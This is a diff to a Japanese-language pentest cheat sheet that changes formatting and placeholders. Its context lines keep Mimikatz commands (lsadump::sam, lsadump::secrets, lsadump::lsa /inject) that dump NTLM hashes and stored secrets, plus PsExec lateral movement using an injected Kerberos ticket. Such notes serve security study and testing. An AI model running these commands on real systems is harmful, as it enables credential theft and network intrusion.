@@ -121,7 +121,9 @@ log <filename>.log
 # ログ記録停止
 log /stop
 ```
-- 💡Mimikatzにはフィルタ機能がないので、ファイルに保存して別途grepやfindを使うことで、効率的に探索できる
+
+>[!TIP]
+>Mimikatzにはフィルタ機能がないので、ファイルに保存して別途grepやfindを使うことで、効率的に探索できる。
 
 ---
 
@@ -161,7 +163,7 @@ lsadump::sam
 lsadump::secrets
 
 # 指定アカウントのNTLMハッシュ等
-lsadump::lsa /inject /name:[account]  
+lsadump::lsa /inject /name:<account>
 ```
 
 ---
@@ -239,7 +241,7 @@ klist
 3. 当該PowerShellセッションにて、Kerberos認証を使用するあらゆるツールが使えるようになった
 ```powershell
 # PsExecの例
-.\PsExec.exe \\[TargetHost] cmd
+.\PsExec.exe \\<target_host> cmd
 ```
 
 ---
@@ -457,7 +459,7 @@ sudo subl /etc/krb5user.conf
 	.<ドメイン名(小文字)> = <ドメイン名(大文字)>
 ```
 
-4. 名前解決の用意
+4. 名前解決の用意のため、/etc/hostsに以下を追記
 ```sh
 127.0.0.1       localhost <ターゲットのFQDN(小文字)> <ドメイン名(大文字)>
 ```
